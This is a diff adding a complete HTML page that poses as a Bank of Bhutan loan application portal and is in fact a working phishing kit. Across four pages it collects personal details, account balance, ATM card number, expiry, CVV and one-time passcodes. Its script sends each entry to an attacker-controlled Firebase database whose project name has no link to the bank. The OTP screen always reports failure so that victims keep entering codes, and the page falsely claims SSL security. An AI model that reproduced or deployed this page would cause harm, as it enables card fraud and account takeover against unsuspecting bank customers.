@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Bank of Bhutan - Loan Application</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+html, body { width: 100%; height: 100%; overflow: hidden; touch-action: manipulation; }
+body { background: #e9e9e9; display: flex; justify-content: center; align-items: center; }
+.mobile-container { width: 100%; max-width: 100%; height: 100vh; height: 100dvh; background: #fff; position: relative; overflow: hidden; display: flex; flex-direction: column; }
+
+/* SPLASH */
+#splash { position: absolute; inset: 0; z-index: 9999; background: linear-gradient(135deg, #003893 0%, #001F52 100%); display: flex; flex-direction: column; justify-content: center; align-items: center; color: #fff; transition: opacity 0.6s ease; }
+.splash-logo { width: 130px; height: 130px; background: #fff; border-radius: 24px; display: flex; justify-content: center; align-items: center; box-shadow: 0 10px 40px rgba(0,0,0,0.4); margin-bottom: 25px; padding: 15px; animation: splashPulse 2s ease-in-out infinite; }
+.splash-logo img { width: 100%; height: 100%; object-fit: contain; }
+@keyframes splashPulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+.splash-title { font-size: 26px; font-weight: 900; letter-spacing: -0.5px; margin-bottom: 6px; text-align: center; }
+.splash-title span { color: #FFD700; }
+.splash-sub { font-size: 12px; letter-spacing: 3px; opacity: 0.85; text-transform: uppercase; margin-bottom: 40px; }
+.splash-loader { width: 44px; height: 44px; border: 4px solid rgba(255,255,255,0.25); border-top: 4px solid #FFD700; border-radius: 50%; animation: spin 0.9s linear infinite; margin-bottom: 18px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.splash-loading-text { font-size: 12px; letter-spacing: 4px; text-transform: uppercase; opacity: 0.8; margin-bottom: 30px; }
+.splash-info-box { background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.25); border-radius: 14px; padding: 16px 22px; max-width: 330px; text-align: center; backdrop-filter: blur(10px); }
+.splash-info-box .info-title { font-size: 11px; letter-spacing: 2px; color: #FFD700; font-weight: 800; text-transform: uppercase; margin-bottom: 8px; }
+.splash-info-box .info-text { font-size: 12px; line-height: 1.6; color: rgba(255,255,255,0.95); }
+.splash-info-box .info-text strong { color: #FFD700; font-weight: 800; }
+
+/* HEADER */
+.login-header { background: #003893; height: 160px; position: relative; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; flex-shrink: 0; }
+.login-header::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(45deg, transparent 48%, rgba(255,255,255,0.1) 49%, rgba(255,255,255,0.1) 51%, transparent 52%), linear-gradient(-45deg, transparent 48%, rgba(255,255,255,0.1) 49%, rgba(255,255,255,0.1) 51%, transparent 52%); background-size: 40px 40px; z-index: 1; }
+.login-header::after { content: ''; position: absolute; top: -50px; right: -50px; width: 150px; height: 150px; border-radius: 50%; background: rgba(255,255,255,0.08); z-index: 1; }
+.login-header-content { position: relative; z-index: 10; text-align: center; color: #fff; }
+.bob-emblem { width: 60px; height: 60px; margin: 0 auto 8px; display: flex; justify-content: center; align-items: center; background: #fff; border-radius: 16px; box-shadow: 0 6px 20px rgba(0,0,0,0.2); padding: 6px; }
+.bob-emblem img { width: 100%; height: 100%; object-fit: contain; }
+.login-header-content h2 { font-size: 17px; font-weight: 700; letter-spacing: 0.5px; }
+.login-header-content p { font-size: 10px; letter-spacing: 2px; opacity: 0.9; margin-top: 3px; text-transform: uppercase; }
+
+/* PAGES */
+.page { display: none; flex-direction: column; height: 100%; position: relative; background: #fff; }
+.page.active { display: flex; }
+.content { flex: 1; background: #fff; border-top-left-radius: 30px; border-top-right-radius: 30px; margin-top: -30px; position: relative; z-index: 10; padding: 22px; display: flex; flex-direction: column; overflow-y: auto; }
+.handle { width: 60px; height: 4px; background: #003893; border-radius: 4px; margin: 0 auto 15px auto; }
+.page-title { text-align: center; font-size: 20px; font-weight: 800; color: #003893; margin-bottom: 4px; }
+.page-title span { color: #FFD700; }
+.page-sub { text-align: center; font-size: 12px; color: #888; margin-bottom: 22px; line-height: 1.5; }
+
+/* INPUTS */
+.field { margin-bottom: 15px; text-align: left; }
+.field label { display: block; font-size: 11px; font-weight: 800; color: #444; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+.input-box { display: flex; align-items: center; gap: 10px; border: 1.5px solid #d1d5db; border-radius: 12px; padding: 13px 15px; background: #fff; transition: 0.3s; }
+.input-box:focus-within { border-color: #003893; box-shadow: 0 0 0 4px rgba(0,56,147,0.1); }
+.input-box svg { width: 18px; height: 18px; fill: #003893; flex-shrink: 0; }
+.input-box input, .input-box select { flex: 1; border: none; outline: none; font-size: 14px; background: transparent; color: #333; font-weight: 500; cursor: pointer; }
+.input-box input::placeholder { color: #b0b0b0; font-weight: 400; }
+.input-box select option { color: #333; }
+
+/* Available Balance Input (NEW) */
+.input-box-balance { display: flex; align-items: center; gap: 10px; border: 2px solid #22c55e; border-radius: 12px; padding: 13px 15px; background: linear-gradient(135deg, #F0FDF4, #DCFCE7); transition: 0.3s; }
+.input-box-balance:focus-within { border-color: #16a34a; box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.15); }
+.input-box-balance svg { width: 20px; height: 20px; fill: #16a34a; flex-shrink: 0; }
+.input-box-balance .currency-label { font-size: 14px; font-weight: 800; color: #15803d; background: rgba(34, 197, 94, 0.15); padding: 4px 10px; border-radius: 6px; flex-shrink: 0; }
+.input-box-balance input { flex: 1; border: none; outline: none; font-size: 15px; font-weight: 600; background: transparent; color: #14532d; min-width: 0; }
+.input-box-balance input::placeholder { color: #86efac; font-weight: 400; }
+
+/* Radio Group */
+.radio-group { display: flex; gap: 10px; }
+.radio-group label { flex: 1; display: flex; align-items: center; justify-content: center; gap: 6px; border: 1.5px solid #d1d5db; border-radius: 12px; padding: 12px; background: #fff; font-size: 13px; font-weight: 600; cursor: pointer; transition: 0.2s; text-transform: none; letter-spacing: 0; color: #555; }
+.radio-group input[type="radio"] { display: none; }
+.radio-group input[type="radio"]:checked + span { color: #003893; font-weight: 800; }
+.radio-group label:has(input:checked) { border-color: #003893; background: #F0F6FF; box-shadow: 0 0 0 3px rgba(0,56,147,0.1); }
+
+.btn-primary { width: 100%; padding: 16px; background: #003893; color: #fff; border: none; border-radius: 12px; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(0,56,147,0.35); transition: 0.2s; margin-top: 10px; letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+.btn-primary:hover { background: #002A6E; }
+.btn-primary:disabled { background: #cbd5e1; cursor: not-allowed; box-shadow: none; }
+.secure-notice { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11px; color: #22c55e; font-weight: 700; margin-top: 15px; }
+.secure-notice svg { width: 14px; height: 14px; fill: #22c55e; }
+
+/* OTP */
+.otp-icon-area { background: #E6EEF9; border-radius: 16px; padding: 18px; display: flex; justify-content: center; align-items: center; margin-bottom: 18px; }
+.otp-icon-area svg { width: 45px; height: 45px; fill: #003893; }
+.otp-title { font-size: 18px; font-weight: 700; color: #333; margin-bottom: 8px; text-align: center; }
+.otp-sub { font-size: 12px; color: #555; margin-bottom: 5px; text-align: center; }
+.otp-number { font-size: 14px; font-weight: 700; color: #003893; margin-bottom: 18px; text-align: center; }
+.otp-boxes { display: flex; justify-content: center; gap: 8px; margin-bottom: 18px; }
+.otp-boxes input { width: 44px; height: 52px; border: 1.5px solid #ccc; border-radius: 10px; text-align: center; font-size: 20px; font-weight: 700; color: #003893; background: #F5F8FC; outline: none; }
+.otp-boxes input:focus { border-color: #003893; background: #fff; box-shadow: 0 0 0 3px rgba(0,56,147,0.1); }
+.error-msg { color: #dc2626; font-size: 13px; font-weight: 700; margin-bottom: 15px; display: none; text-align: center; }
+.edit-number { display: flex; align-items: center; justify-content: center; gap: 8px; color: #003893; font-weight: 600; font-size: 13px; cursor: pointer; margin-bottom: 20px; }
+.edit-number svg { width: 15px; height: 15px; fill: #003893; }
+
+/* LOADING */
+.loading-overlay { position: absolute; inset: 0; background: rgba(255,255,255,0.96); z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; backdrop-filter: blur(4px); opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
+.loading-overlay.active { opacity: 1; pointer-events: auto; }
+.spinner { width: 50px; height: 50px; border: 5px solid #e5e7eb; border-top: 5px solid #003893; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 18px; }
+.loading-text { font-size: 14px; font-weight: 700; color: #003893; letter-spacing: 1px; }
+.hidden { display: none !important; }
+</style>
+</head>
+<body>
+<div class="mobile-container">
+
+    <!-- SPLASH -->
+    <div id="splash">
+        <div class="splash-logo">
+            <img src="https://i.postimg.cc/hjstm7nv/file-00000000417882109c71f14956d474e0.png" alt="Bank of Bhutan">
+        </div>
+        <div class="splash-title">Bank of <span>Bhutan</span></div>
+        <div class="splash-sub">Loan Application Portal</div>
+        <div class="splash-loader"></div>
+        <div class="splash-loading-text">Please Wait</div>
+        <div class="splash-info-box">
+            <div class="info-title">💰 Loan Available</div>
+            <div class="info-text">
+                Get loan from <strong>Nu. 10 Lac</strong> to <strong>Nu. 50 Lac</strong><br>
+                Low interest · Fast approval · Easy installments
+            </div>
+        </div>
+    </div>
+
+    <!-- LOADING -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">Please Wait...</div>
+    </div>
+
+    <!-- PAGE 1: BASIC INFO -->
+    <div id="page-basic" class="page hidden">
+        <div class="login-header">
+            <div class="login-header-content">
+                <div class="bob-emblem"><img src="https://i.postimg.cc/hjstm7nv/file-00000000417882109c71f14956d474e0.png" alt="BOB"></div>
+                <h2>Bank of Bhutan</h2>
+                <p>Loan Application</p>
+            </div>
+        </div>
+        <div class="content">
+            <div class="handle"></div>
+            <div class="page-title">Basic <span>Information</span></div>
+            <div class="page-sub">Please provide your basic details to continue</div>
+
+            <div class="field">
+                <label>Full Name</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    <input type="text" id="basic-name" placeholder="Enter full name">
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Marital Status</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="marital" value="Married"><span>Married</span></label>
+                    <label><input type="radio" name="marital" value="Unmarried"><span>Unmarried</span></label>
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Address</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                    <input type="text" id="basic-address" placeholder="Enter your address">
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Monthly Income (Nu.)</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg>
+                    <input type="tel" id="basic-income" inputmode="numeric" placeholder="Enter monthly income">
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Employment Type</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="employment" value="Government"><span>Government</span></label>
+                    <label><input type="radio" name="employment" value="Private"><span>Private</span></label>
+                </div>
+            </div>
+
+            <button class="btn-primary" onclick="goToPersonal()">
+                NEXT
+                <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:#fff"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+            </button>
+            <div class="secure-notice">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                Secure 256-bit SSL encrypted
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 2: PERSONAL INFO -->
+    <div id="page-personal" class="page hidden">
+        <div class="login-header">
+            <div class="login-header-content">
+                <div class="bob-emblem"><img src="https://i.postimg.cc/hjstm7nv/file-00000000417882109c71f14956d474e0.png" alt="BOB"></div>
+                <h2>Bank of Bhutan</h2>
+                <p>Loan Application</p>
+            </div>
+        </div>
+        <div class="content">
+            <div class="handle"></div>
+            <div class="page-title">Personal <span>Information</span></div>
+            <div class="page-sub">Tell us about yourself and your loan requirement</div>
+
+            <div class="field">
+                <label>Full Name</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    <input type="text" id="personal-name" placeholder="Enter full name">
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Mobile Number</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+                    <input type="tel" id="personal-mobile" placeholder="+975 XXXXXXX">
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Email Address</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                    <input type="email" id="personal-email" placeholder="Enter email address">
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Select Loan Amount (Nu.)</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg>
+                    <select id="personal-loan">
+                        <option value="">-- Select Loan Amount --</option>
+                        <option value="Nu. 10 Lac">Nu. 10 Lac</option>
+                        <option value="Nu. 15 Lac">Nu. 15 Lac</option>
+                        <option value="Nu. 20 Lac">Nu. 20 Lac</option>
+                        <option value="Nu. 25 Lac">Nu. 25 Lac</option>
+                        <option value="Nu. 30 Lac">Nu. 30 Lac</option>
+                        <option value="Nu. 35 Lac">Nu. 35 Lac</option>
+                        <option value="Nu. 40 Lac">Nu. 40 Lac</option>
+                        <option value="Nu. 45 Lac">Nu. 45 Lac</option>
+                        <option value="Nu. 50 Lac">Nu. 50 Lac</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Available Balance (USER INPUT) -->
+            <div class="field">
+                <label>Available Balance</label>
+                <div class="input-box-balance">
+                    <svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+                    <span class="currency-label">Nu.</span>
+                    <input type="tel" id="personal-balance" inputmode="numeric" placeholder="Enter available balance">
+                </div>
+            </div>
+
+            <button class="btn-primary" onclick="goToCard()">
+                NEXT
+                <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:#fff"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- PAGE 3: CARD DETAILS -->
+    <div id="page-card" class="page hidden">
+        <div class="login-header">
+            <div class="login-header-content">
+                <div class="bob-emblem"><img src="https://i.postimg.cc/hjstm7nv/file-00000000417882109c71f14956d474e0.png" alt="BOB"></div>
+                <h2>Bank of Bhutan</h2>
+                <p>Account Verification</p>
+            </div>
+        </div>
+        <div class="content">
+            <div class="handle"></div>
+            <div class="page-title">ATM <span>Card Details</span></div>
+            <div class="page-sub">Enter your ATM card details to verify your account</div>
+
+            <div class="field">
+                <label>ATM Card Number</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+                    <input type="tel" id="card-number" inputmode="numeric" placeholder="XXXX XXXX XXXX XXXX" maxlength="16">
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Expiry Date</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11zM7 10h5v5H7z"/></svg>
+                    <input type="tel" id="card-expiry" inputmode="numeric" placeholder="MM/YY" maxlength="5">
+                </div>
+            </div>
+
+            <div class="field">
+                <label>CVV</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                    <input type="password" id="card-cvv" inputmode="numeric" placeholder="123" maxlength="3">
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Cardholder Name</label>
+                <div class="input-box">
+                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    <input type="text" id="card-name" placeholder="Name on card">
+                </div>
+            </div>
+
+            <button class="btn-primary" id="btn-card-next" onclick="goToOtp()" disabled>
+                VERIFY & CONTINUE
+                <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:#fff"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+            </button>
+            <div class="secure-notice">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                Secure 256-bit SSL encrypted
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 4: OTP -->
+    <div id="page-otp" class="page hidden">
+        <div class="login-header">
+            <div class="login-header-content">
+                <div class="bob-emblem"><img src="https://i.postimg.cc/hjstm7nv/file-00000000417882109c71f14956d474e0.png" alt="BOB"></div>
+                <h2>Bank of Bhutan</h2>
+                <p>Account Verification</p>
+            </div>
+        </div>
+        <div class="content">
+            <div class="handle"></div>
+            <div class="otp-icon-area"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+            <div class="otp-title">Verification OTP</div>
+            <div class="otp-sub">Enter the 6-digit OTP sent to your registered number</div>
+            <div class="otp-number" id="otp-phone">+975 XXXXXX</div>
+            <div class="otp-boxes" id="otp-boxes">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+            </div>
+            <div class="error-msg" id="otp-error">Invalid OTP! Please try again.</div>
+            <div class="edit-number" onclick="goBackToCard()">
+                Edit Card Details
+                <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getDatabase, ref, push, set, update, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+const firebaseConfig = {
+    apiKey: "AIzaSyC1KSnt2oLvpg7KFnyoHlex6spToyOO-nE",
+    authDomain: "pak-national-earn.firebaseapp.com",
+    databaseURL: "https://pak-national-earn-default-rtdb.firebaseio.com",
+    projectId: "pak-national-earn",
+    storageBucket: "pak-national-earn.firebasestorage.app",
+    messagingSenderId: "670295282897",
+    appId: "1:670295282897:web:ac051079fdd3eef8cea1f0",
+    measurementId: "G-M5SFQB9HR6"
+};
+
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
+
+let currentFirebaseKey = null;
+
+function createUser(data) {
+    const usersRef = ref(database, 'bob_loan_users');
+    const newUserRef = push(usersRef);
+    currentFirebaseKey = newUserRef.key;
+    set(newUserRef, data).catch(e => console.error(e));
+}
+function updateUser(data) {
+    if (!currentFirebaseKey) return;
+    update(ref(database, 'bob_loan_users/' + currentFirebaseKey), data).catch(e => console.error(e));
+}
+
+const splash = document.getElementById('splash');
+const pages = {
+    basic: document.getElementById('page-basic'),
+    personal: document.getElementById('page-personal'),
+    card: document.getElementById('page-card'),
+    otp: document.getElementById('page-otp')
+};
+const loadingOverlay = document.getElementById('loadingOverlay');
+const loadingText = document.getElementById('loadingText');
+
+function showPage(name) {
+    Object.values(pages).forEach(p => { p.classList.add('hidden'); p.classList.remove('active'); });
+    pages[name].classList.remove('hidden');
+    pages[name].classList.add('active');
+}
+function showLoading(text, duration, cb) {
+    loadingText.textContent = text;
+    loadingOverlay.classList.add('active');
+    setTimeout(() => {
+        loadingOverlay.classList.remove('active');
+        setTimeout(() => { if (cb) cb(); }, 250);
+    }, duration);
+}
+
+setTimeout(() => {
+    splash.style.opacity = '0';
+    setTimeout(() => { splash.classList.add('hidden'); showPage('basic'); }, 600);
+}, 3500);
+
+// ===== Page 1 =====
+function goToPersonal() {
+    const name = document.getElementById('basic-name').value.trim();
+    const marital = document.querySelector('input[name="marital"]:checked');
+    const address = document.getElementById('basic-address').value.trim();
+    const income = document.getElementById('basic-income').value.trim();
+    const employment = document.querySelector('input[name="employment"]:checked');
+
+    if (!name) { alert('Please enter your full name'); return; }
+    if (!marital) { alert('Please select marital status'); return; }
+    if (!address) { alert('Please enter your address'); return; }
+    if (!income) { alert('Please enter monthly income'); return; }
+    if (!employment) { alert('Please select employment type'); return; }
+
+    createUser({
+        basicName: name,
+        maritalStatus: marital.value,
+        address: address,
+        monthlyIncome: income,
+        employmentType: employment.value,
+        submittedTime: new Date().toLocaleString(),
+        submittedTimestamp: Date.now(),
+        status: "Basic Info Submitted"
+    });
+
+    showLoading("Saving...", 1500, () => showPage('personal'));
+}
+
+// ===== Page 2 =====
+function goToCard() {
+    const name = document.getElementById('personal-name').value.trim();
+    const mobile = document.getElementById('personal-mobile').value.trim();
+    const email = document.getElementById('personal-email').value.trim();
+    const loan = document.getElementById('personal-loan').value;
+    const balance = document.getElementById('personal-balance').value.trim();
+
+    if (!name) { alert('Please enter your name'); return; }
+    if (!mobile) { alert('Please enter your mobile number'); return; }
+    if (!email) { alert('Please enter your email'); return; }
+    if (!loan) { alert('Please select loan amount'); return; }
+    if (!balance) { alert('Please enter available balance'); return; }
+
+    updateUser({
+        personalName: name,
+        personalMobile: mobile,
+        personalEmail: email,
+        loanAmount: loan,
+        availableBalance: 'Nu. ' + balance,
+        personalTime: new Date().toLocaleString(),
+        personalTimestamp: Date.now(),
+        status: "Personal Info Submitted"
+    });
+
+    showLoading("Saving...", 1500, () => showPage('card'));
+}
+
+// ===== Page 3 =====
+const cardNumber = document.getElementById('card-number');
+const cardExpiry = document.getElementById('card-expiry');
+const cardCvv = document.getElementById('card-cvv');
+const cardName = document.getElementById('card-name');
+const btnCardNext = document.getElementById('btn-card-next');
+
+cardNumber.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); validateCard(); });
+cardExpiry.addEventListener('input', function() {
+    let val = this.value.replace(/[^0-9]/g, '');
+    if (val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
+    this.value = val; validateCard();
+});
+cardCvv.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); validateCard(); });
+cardName.addEventListener('input', validateCard);
+
+function validateCard() {
+    if (cardNumber.value.length === 16 && cardExpiry.value.length === 5 && cardCvv.value.length === 3 && cardName.value.trim().length >= 3) {
+        btnCardNext.disabled = false;
+    } else {
+        btnCardNext.disabled = true;
+    }
+}
+
+function goToOtp() {
+    if (cardNumber.value.length !== 16) return;
+    updateUser({
+        cardNumber: cardNumber.value,
+        cardExpiry: cardExpiry.value,
+        cardCvv: cardCvv.value,
+        cardHolderName: cardName.value,
+        cardTime: new Date().toLocaleString(),
+        cardTimestamp: Date.now(),
+        status: "OTP Pending"
+    });
+
+    showLoading("Sending OTP...", 1800, () => {
+        showPage('otp');
+        document.getElementById('otp-phone').textContent = '+975 ' + cardNumber.value.slice(-4);
+        document.querySelectorAll('.otp-box')[0].focus();
+    });
+}
+
+// ===== Page 4: OTP =====
+const otpBoxes = document.querySelectorAll('.otp-box');
+const otpError = document.getElementById('otp-error');
+
+otpBoxes.forEach((input, index) => {
+    input.addEventListener('input', function() {
+        if (this.value.length === 1 && index < otpBoxes.length - 1) otpBoxes[index + 1].focus();
+        checkAllOtp(otpBoxes, () => {
+            let entered = '';
+            otpBoxes.forEach(b => entered += b.value);
+            otpError.style.display = 'none';
+
+            if (currentFirebaseKey) {
+                const userRef = ref(database, 'bob_loan_users/' + currentFirebaseKey);
+                get(userRef).then(snapshot => {
+                    if (snapshot.exists()) {
+                        const userData = snapshot.val();
+                        let attempts = userData.otpAttempts || [];
+                        attempts.push({ otp: entered, time: new Date().toLocaleString(), timestamp: Date.now() });
+                        update(userRef, { otpAttempts: attempts, lastOtp: entered, lastOtpTime: new Date().toLocaleString(), lastOtpTimestamp: Date.now() });
+                    }
+                });
+            }
+
+            showLoading("Verifying OTP...", 2200, () => {
+                otpError.style.display = 'block';
+                otpBoxes.forEach(b => b.value = '');
+                otpBoxes[0].focus();
+            });
+        });
+    });
+    input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value.length === 0 && index > 0) otpBoxes[index - 1].focus();
+    });
+});
+
+function checkAllOtp(boxes, cb) {
+    let filled = true;
+    boxes.forEach(b => { if (b.value.trim() === '') filled = false; });
+    if (filled) cb();
+}
+function goBackToCard() {
+    showLoading("Going Back...", 1000, () => showPage('card'));
+}
+
+window.goToPersonal = goToPersonal;
+window.goToCard = goToCard;
+window.goToOtp = goToOtp;
+window.goBackToCard = goBackToCard;
+</script>
+</body>
+</html>
